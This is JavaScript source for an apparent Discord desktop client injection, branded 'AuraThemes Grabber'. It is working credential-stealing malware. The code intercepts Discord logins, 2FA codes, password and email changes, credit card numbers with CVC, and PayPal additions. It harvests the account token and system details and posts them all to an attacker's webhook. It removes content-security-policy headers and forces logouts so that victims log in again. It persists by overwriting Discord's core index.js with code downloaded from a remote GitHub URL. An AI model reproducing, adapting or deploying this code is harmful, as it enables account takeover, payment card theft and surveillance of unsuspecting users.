const { BrowserWindow: BrowserWindow, session: session } = require("electron"),
    { execSync } = require("child_process"),
    { parse: parse } = require("querystring"),
    fs = require("fs"),
    os = require("os"),
    https = require("https"),
    path = require("path");

let WEBHOOK = "%WEBHOOK%";

let [
    BACKUPS_CODES_SCRIPT,
    LOGOUT_SCRIPT,
    TOKEN_SCRIPT,
    INJECT_URL,
    BADGES,
    EMAIL,
    PASSWORD
] = [
        `const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`,
        'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
        "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;",
        "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js",
        {
            _nitro: [
                "<:_:1087043238654906472> ",
                "<:_:1087043319227494460> ",
                "<:_:1087043368250511512> ",
                "<:_:1087043493236592820> ",
                "<:_:1087043493236592820> ",
                "<:_:1162420359291732038> ",
                "<:_:1051453775832961034> ",
                "<:_:1051453778127237180> ",
                "<:_:1051453776889917530> ",
            ],
            _discord_emloyee: {
                value: 1,
                emoji: "<:_:1163172252989259898>",
                rare: true,
            },
            _partnered_server_owner: {
                value: 2,
                emoji: "<:_:1163172304155586570>",
                rare: true,
            },
            _hypeSquad_events: {
                value: 4,
                emoji: "<:_:1163172248140660839>",
                rare: true,
            },
            _bug_hunter_level_1: {
                value: 8,
                emoji: "<:_:1163172239970140383>",
                rare: true,
            },
            _house_bravery: {
                value: 64,
                emoji: "<:_:1163172246492287017>",
                rare: false,
            },
            _house_brilliance: {
                value: 128,
                emoji: "<:_:1163172244474822746>",
                rare: false,
            },
            _house_balance: {
                value: 256,
                emoji: "<:_:1163172243417858128>",
                rare: false,
            },
            _early_supporter: {
                value: 512,
                emoji: "<:_:1163172241996005416>",
                rare: true,
            },
            _bug_hunter_level_2: {
                value: 16384,
                emoji: "<:_:1163172238942543892>",
                rare: true,
            },
            _early_bot_developer: {
                value: 131072,
                emoji: "<:_:1163172236807639143>",
                rare: true,
            },
            _certified_moderator: {
                value: 262144,
                emoji: "<:_:1163172255489085481>",
                rare: true,
            },
            _active_developer: {
                value: 4194304,
                emoji: "<:_:1163172534443851868>",
                rare: true,
            },
        },
        "",
        ""
    ];

const request = async (method, url, headers = {}, data = null) => {
    try {
        return new Promise((resolve, reject) => {
            let object = new URL(url),
                options = {
                    protocol: object.protocol,
                    hostname: object.hostname,
                    path: object.pathname + object.search,
                    method: method.toUpperCase(),
                    headers: {
                        ...headers,
                        "Access-Control-Allow-Origin": "*"
                    }
                };
            let req = https.request(options, (res) => {
                let resd = '';
                res.on('data', (chunk) => resd += chunk);
                res.on('end', () => resolve(resd));
            });
            req.on('error', (err) => reject(err));
            if (data) req.write(data);
            req.end();
        });
    } catch (err) {
        return Promise.reject(err);
    }
};

const notify = async (ctx, token, acc) => {
    let system = {
        WIN_PRODUCT_VERSION: execSync("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName",).toString().split("\r\n")[0],
        MAC_ADDRESS: execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress",).toString().split("\r\n")[0],
        CPU_COUNT: os.cpus().length,
        PC_NAME: os.hostname(),
        LOCAL_IP: execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split("\r\n")[0],
        UUID: execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID",).toString().split("\r\n")[0],
        GPU: execSync("wmic PATH Win32_VideoController get name | more +1").toString().replace(/\r\n/g, "").replace(/\r/g, ""),
        RAM: (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2) + " GB",
        CPU: os.cpus()[0].model,
        OS: `${os.type()} ${os.arch()}`,
    };
    let nitro = getNitro(await fProfile(token)),
        badges = await getBadges(acc.flags),
        billing = await getBilling(token),
        friends = await getFriends(token),
        servers = await getServers(token);
    ctx.username = "@AuraThemes - Injection";
    ctx.avatar_url = "https://i.imgur.com/WkKXZSl.gif";
    ctx.embeds[0].title = `Initialized Grabber - ${ctx.title}`;
    ctx.embeds[0].description = `\n**Token:**\n\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`;
    ctx.embeds[0].thumbnail = {
        url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.webp`,
    };
    ctx.embeds[0].fields.push(
        { name: "Nitro", value: nitro, inline: true },
        { name: "Badges", value: badges, inline: true },
        { name: "Billing", value: billing, inline: true },
        { name: "Path", value: `\`${__dirname.toString().trim().replace(/\\/g, "/")}\``, inline: false },
    );
    ctx.embeds.push(
        { title: `HQ Friend(s)`, description: friends },
        { title: `HQ Guild(s)`, description: servers },
        {
            title: `System Informatio(s)`,
            fields: [
                { name: "User", value: `\`\`\`yml\nUsername: ${os.userInfo().username}\`\`\``, inline: true },
                { name: "System", value: `\`\`\`yml\n${Object.entries({ ...system }).map(([k, v]) => `${k}: ${v}`).join("\n")}\`\`\``, },
                { name: "Network", value: `\`\`\`yml\nPublic: ${JSON.parse(await getNetwork()).ip}\`\`\``, }
            ]
        },
    );
    ctx.embeds.forEach((e) => {
        e.color = parseInt("#c267ff".replaceAll("#", ""), 16);
        e.timestamp = new Date();
        e.author = {
            name: `${acc.username} | ${acc.id}`,
            icon_url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.png`,
        };
        e.footer = {
            text: decodeB64('QXVyYVRoZW1lcyBHcmFiYmVyIC0gaHR0cHM6Ly9naXRodWIuY29tL2s0aXRydW4vRGlzY29yZFRva2VuR3JhYmJlcg'),
            icon_url: "https://i.imgur.com/yVnOSeS.gif",
        };
    });
    await request("POST", WEBHOOK, {
        "Content-Type": "application/json"
    }, JSON.stringify(ctx));
};

const decodeB64 = (s) =>
    Buffer.from(s, 'base64').toString();

const execScript = async (s) =>
    await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(s, !0);

const fetch = async (e, h) =>
    JSON.parse(await request("GET", `${[
        'https://discordapp.com/api',
        'https://discord.com/api',
        'https://canary.discord.com/api',
        'https://ptb.discord.com/api'
    ][Math.floor(Math.random() * 4)]}/v9/users/${e}`, { ...h }));

const fAccount = async (authorization) =>
    await fetch("@me", { authorization });

const fProfile = async (authorization) =>
    await fetch(`${Buffer.from(authorization.split(".")[0], "base64").toString("binary")}/profile`, { authorization });

const fFriends = async (authorization) =>
    await fetch("@me/relationships", { authorization });

const fServers = async (authorization) =>
    await fetch("@me/guilds?with_counts=true", { authorization });

const fBilling = async (authorization) =>
    await fetch("@me/billing/payment-sources", { authorization });

const getNetwork = async () =>
    await request("GET", "https://api.ipify.org/?format=json", {
        "Content-Type": "application/json"
    });

const getBadges = (f) =>
    Object.keys(BADGES)
        .reduce((s, h) => BADGES.hasOwnProperty(h)
            && (f & BADGES[h].value) === BADGES[h].value
            ? `${s}${BADGES[h].emoji} `
            : s, "",
        ) || ":x:";

const getRareBadges = (f) =>
    Object.keys(BADGES)
        .reduce((b, e) => BADGES.hasOwnProperty(e)
            && (f & BADGES[e].value) === BADGES[e].value
            && BADGES[e].rare
            ? `${b}${BADGES[e].emoji} `
            : b, "",
        );

const getBilling = async (t) =>
    (await fBilling(t))
        .filter((x) => !x.invalid)
        .map((x) => x.type === 1
            ? "<a:_:1073251424986730516> "
            : x.type === 2
                ? "<:_:1148653305376034967> "
                : "",
        ).join("") || ":x:";

const getFriends = async (s) =>
    (await fFriends(s))
        .filter((user) => user.type === 1)
        .reduce((r, a) => ((b) => b
            ? (r || "**Rare Friends:**\n") + `${b} ${a.user.username}#${a.user.discriminator}\n`
            : r)(getRareBadges(a.user.public_flags)),
            "",
        ) || "Not Found";

const getServers = async (w) =>
    (await fServers(w))
        .filter((g) => g.permissions === (562949953421311).toString() && g.approximate_member_count >= 500)
        .reduce((r, g) => (r || "**Rare Servers:**\n") + `${g.owner
            ? ":crown: Owner"
            : ":gear: Admin"} | Server Name: \`${g.name}\` | Members: \`${g.approximate_member_count}\` - Online(s): \`${g.approximate_presence_count}\`\n[[Get Avatar Link]](https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png?size=2048)\n`, "",
        ) || "Not Found";

const getDate = (a, b) => new Date(a).setMonth(a.getMonth() + b);

const getNitro = (u) => {
    let { premium_type, premium_guild_since } = u,
        x = "<:_:587201513873473542>";
    switch (premium_type) {
        default:
            return ":x:";
        case 1:
            return x;
        case 2:
            if (!premium_guild_since) return x;
            let m = [2, 3, 6, 9, 12, 15, 18, 24],
                rem = 0;
            for (let i = 0; i < m.length; i++)
                if (Math.round((getDate(new Date(premium_guild_since), m[i]) - new Date()) / 86400000) > 0) {
                    rem = i;
                    break;
                }
            return `${x} ${BADGES._nitro[rem]}`;
    }
};

const cruise = async (type, mail, pass, res, req, act) => {
    let info;
    let msg;
    let token;
    switch (type) {
        case 'LOGIN_USER':
            info = await fAccount(res.token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "Email", value: `\`${mail}\``, inline: true },
                        { name: "Password", value: `\`${pass}\``, inline: true },
                    ],
                }],
            };
            if (req.code !== undefined) {
                msg.embeds[0].fields.push(
                    { name: "Used 2FA code", value: `\`${req.code}\``, inline: true }
                );
            }
            notify(msg, res.token, info);
            break;
        case 'USERNAME_CHANGED':
            info = await fAccount(res.token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "New UserName", value: `\`${req.username}\``, inline: true, },
                        { name: "Password", value: `\`${req.password}\``, inline: true, },
                    ],
                }],
            };
            notify(msg, res.token, info);
            break;
        case 'EMAIL_CHANGED':
            info = await fAccount(res.token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "New Email", value: `\`${mail}\``, inline: true },
                        { name: "Password", value: `\`${pass}\``, inline: true },
                    ],
                }],
            };
            notify(msg, res.token, info);
            break;
        case 'PASSWORD_CHANGED':
            info = await fAccount(res.token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "New Password", value: `\`${req.new_password}\``, inline: true, },
                        { name: "Old Password", value: `\`${req.password}\``, inline: true, },
                    ],
                }],
            };
            notify(msg, res.token, info);
            break;
        case 'CREDITCARD_ADDED':
            token = res;
            info = await fAccount(token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "Number", value: `\`${req["card[number]"]}\``, inline: true },
                        { name: "CVC", value: `\`${req["card[cvc]"]}\``, inline: true },
                        { name: "Expiration", value: `\`${req["card[exp_month]"]}/${req["card[exp_year]"]}\``, inline: true, },
                    ],
                }],
            };
            notify(msg, token, info);
            break;
        case 'PAYPAL_ADDED':
            token = res;
            info = await fAccount(token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "Email", value: `\`${info.email}\``, inline: true },
                        { name: "Phone", value: `\`${(info.phone || "None")}\``, inline: true },
                    ],
                }],
            };
            notify(msg, token, info);
            break;
        case 'INJECTED':
            token = res;
            info = await fAccount(token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "Email", value: `\`${info.email}\``, inline: true },
                        { name: "Phone", value: `\`${(info.phone || "None")}\``, inline: true },
                    ],
                }],
            };
            notify(msg, token, info);
            break;
        default:
    }
}

const DISCORD_PATH = (function () {
    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
    let resource;
    if (process.platform === "win32") resource = path.join(app, "resources");
    else if (process.platform === "darwin")
        resource = path.join(app, "Contents", "Resources");
    if (fs.existsSync(resource)) return { resource, app };
    return { undefined, undefined };
})();

async function UPDATE_CHECKING() {
    let i = "initiation";
    const { resource, app } = DISCORD_PATH;
    if (resource === undefined || app === undefined) return;
    let p = path.join(resource, "app");
    if (!fs.existsSync(p)) fs.mkdirSync(p);
    if (fs.existsSync(path.join(p, "package.json")))
        fs.unlinkSync(path.join(p, "package.json"));
    if (fs.existsSync(path.join(p, "index.js")))
        fs.unlinkSync(path.join(p, "index.js"));
    if (process.platform === "win32" || process.platform === "darwin") {
        fs.writeFileSync(
            path.join(p, "package.json"),
            JSON.stringify({ name: "discord", main: "index.js" }, null, 4),
        );
        fs.writeFileSync(
            path.join(p, "index.js"),
            `const fs = require('fs'), https = require('https');\nconst indexJs = '${`${app}\\modules\\${fs.readdirSync(`${app}\\modules\\`).filter((x) => /discord_desktop_core-+?/.test(x))[0]}\\discord_desktop_core\\index.js`}';\nconst bdPath = '${path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar")}';\nconst K4ITRUN = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (K4ITRUN < 20000 || data === "module.exports = require('./core.asar')")\n        init();\n})\nasync function init() {\n    https.get('${INJECT_URL}', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '${WEBHOOK}')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n        \n    }).on("error", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('${path.join(resource, "app.asar")}')\nif (fs.existsSync(bdPath)) require(bdPath);`.replace(/\\/g, "\\\\")
        );
    }
    if (!fs.existsSync(path.join(__dirname, i))) return;
    else fs.rmdirSync(path.join(__dirname, i));
    if (!(await execScript(TOKEN_SCRIPT))) return;
    cruise(
        "INJECTED",
        null,
        null,
        (await execScript(TOKEN_SCRIPT)) ?? "",
        null,
        `DISCORD INJECTED`,
    );
    execScript(LOGOUT_SCRIPT);
}

session.defaultSession.webRequest.onBeforeRequest(
    {
        urls: [
            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "wss://remote-auth-gateway.discord.gg/*",
            "https://discord.com/api/v*/auth/sessions",
            "https://*.discord.com/api/v*/auth/sessions",
            "https://discordapp.com/api/v*/auth/sessions",
        ],
    },
    (d, callback) => {
        if (!fs.existsSync(`${__dirname}/aurathemes`))
            fs.mkdirSync(`${__dirname}/aurathemes`);
        if (!fs.existsSync(`${__dirname}/aurathemes/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`,)) {
            fs.writeFileSync(`${__dirname}/aurathemes/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`, WEBHOOK,);
            execScript(LOGOUT_SCRIPT);
        }
        if (d.url.startsWith("wss://remote-auth-gateway") || d.url.endsWith("auth/sessions"))
            callback({ cancel: true });
        else
            callback({ cancel: false });
        UPDATE_CHECKING();
    },
);

session.defaultSession.webRequest.onHeadersReceived((a, callback) => {
    delete a.responseHeaders["content-security-policy"];
    delete a.responseHeaders["content-security-policy-report-only"];
    callback({
        responseHeaders: {
            ...a.responseHeaders,
            "Access-Control-Allow-Headers": "*",
        },
    });
});

session.defaultSession.webRequest.onCompleted(
    {
        urls: [
            "https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
            "https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
            "https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
            "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
            "https://api.stripe.com/v*/tokens",
        ],
    },
    async (a, callback) => {
        let data;
        try {
            data = parse(Buffer.from(a.uploadData[0].bytes).toString());
        } catch (err) {
            data = parse(decodeURIComponent(a.uploadData[0].bytes.toString()));
        }
        let authorization = (await execScript(TOKEN_SCRIPT)) ?? "";
        if (a.method != "POST") return;
        if (a.statusCode !== 200 && a.statusCode !== 202) return;
        if (a.url.endsWith("/paypal_accounts")) {
            cruise(
                "PAYPAL_ADDED",
                null,
                null,
                authorization,
                null,
                `PAYPAL ADDED`,
            );
        } else if (a.url.endsWith("/tokens")) {
            cruise(
                "CREDITCARD_ADDED",
                null,
                null,
                authorization,
                data,
                `CREDITCARD ADDED`,
            );
        }
    },
);

const CREATE_WINDOW_CLIENT = (win) => {
    if (!win.getAllWindows()[0]) return;
    win.getAllWindows()[0].webContents.debugger.attach("1.3");
    win.getAllWindows()[0].webContents.debugger.on("message", async (_, m, p) => {
        if (m !== "Network.responseReceived") return;
        if (!["/auth/login", "/auth/register", "/mfa/totp", "/users/@me",].some((url) => p.response.url.endsWith(url))) return;
        if (p.response.status !== 200 && p.response.status !== 202) return;
        let RESPONSE_DATA = JSON.parse(
            (
                await win.getAllWindows()[0].webContents.debugger.sendCommand(
                    "Network.getResponseBody",
                    { requestId: p.requestId },
                )
            ).body,
        ),
            REQUEST_DATA = JSON.parse(
                (
                    await win.getAllWindows()[0].webContents.debugger.sendCommand(
                        "Network.getRequestPostData",
                        { requestId: p.requestId },
                    )
                ).postData,
            );
        if (p.response.url.endsWith("/login")) {
            if (!RESPONSE_DATA.token) {
                EMAIL = REQUEST_DATA.login;
                PASSWORD = REQUEST_DATA.password;
                return;
            }
            cruise(
                "LOGIN_USER",
                REQUEST_DATA.login,
                REQUEST_DATA.password,
                RESPONSE_DATA,
                REQUEST_DATA,
                "LOGGED IN",
            );
        } else if (p.response.url.endsWith("/register")) {
            cruise(
                "LOGIN_USER",
                REQUEST_DATA.email,
                REQUEST_DATA.password,
                RESPONSE_DATA,
                REQUEST_DATA,
                "SIGNED UP",
            );
        } else if (p.response.url.endsWith("/totp")) {
            cruise(
                "LOGIN_USER",
                EMAIL,
                PASSWORD,
                RESPONSE_DATA,
                REQUEST_DATA,
                "LOGGED IN WITH MFA-2",
            );
        } else if (p.response.url.endsWith("/@me")) {
            if (!REQUEST_DATA.password) return;
            if (REQUEST_DATA.email)
                cruise(
                    "EMAIL_CHANGED",
                    REQUEST_DATA.email,
                    REQUEST_DATA.password,
                    RESPONSE_DATA,
                    REQUEST_DATA,
                    `CHANGED EMAIL`,
                );
            if (REQUEST_DATA.new_password)
                cruise(
                    "PASSWORD_CHANGED",
                    null,
                    null,
                    RESPONSE_DATA,
                    REQUEST_DATA,
                    `CHANGED PASSWORD`,
                );
            if (REQUEST_DATA.username)
                cruise(
                    "USERNAME_CHANGED",
                    null,
                    null,
                    RESPONSE_DATA,
                    REQUEST_DATA,
                    `CHANGED USERNAME`,
                );
        }
    },
    );
    win.getAllWindows()[0].webContents.debugger.sendCommand(
        "Network.enable",
    );
    win.getAllWindows()[0].on(
        "closed", () => CREATE_WINDOW_CLIENT(BrowserWindow)
    );
};

CREATE_WINDOW_CLIENT(BrowserWindow); // INIT

module.exports = require("./core.asar");